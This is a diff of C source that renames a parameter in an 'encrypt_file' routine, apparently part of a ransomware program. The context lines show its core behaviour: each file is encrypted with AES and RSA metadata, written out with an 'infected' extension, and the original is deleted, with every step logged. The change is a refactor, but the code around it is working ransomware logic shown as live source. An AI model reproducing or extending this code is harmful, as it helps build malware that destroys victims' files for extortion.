@@ -276,7 +276,7 @@ int worker_encryption_proc(thread_args* args)
     }
 }
 
-int encrypt_file(char* path, char* ciphername)
+int encrypt_file(char* original_path, char* ciphername)
 {
     int is_encrypted = 0;
     unsigned char* iv = 0;
@@ -313,8 +313,8 @@ int encrypt_file(char* path, char* ciphername)
     out = (unsigned char*)calloc(BUFSIZ+EVP_MAX_BLOCK_LENGTH, 1);
     renamed_path = (char*)calloc(MAX_PATH_LENGTH, 1);
 
-    infp = fopen(path, "rb");
-    snprintf(renamed_path, MAX_PATH_LENGTH, "%s%s", path, INFECTED_FILE_EXT);
+    infp = fopen(original_path, "rb");
+    snprintf(renamed_path, MAX_PATH_LENGTH, "%s%s", original_path, INFECTED_FILE_EXT);
     outfp = fopen(renamed_path, "wb");
     if (!infp && !outfp)
     {
@@ -344,9 +344,9 @@ int encrypt_file(char* path, char* ciphername)
     fwrite(&aes_metadata.signature, 4, 1, outfp);
     is_encrypted = 1;
     fprintf(logger, "\t encrypted: %s\n", renamed_path);
-    if (!remove(path))
+    if (!remove(original_path))
     {
-        fprintf(logger, "\t deleted: %s\n", path);
+        fprintf(logger, "\t deleted: %s\n", original_path);
     }
 
 CLEANUP_RSA_ENCRYPTION:
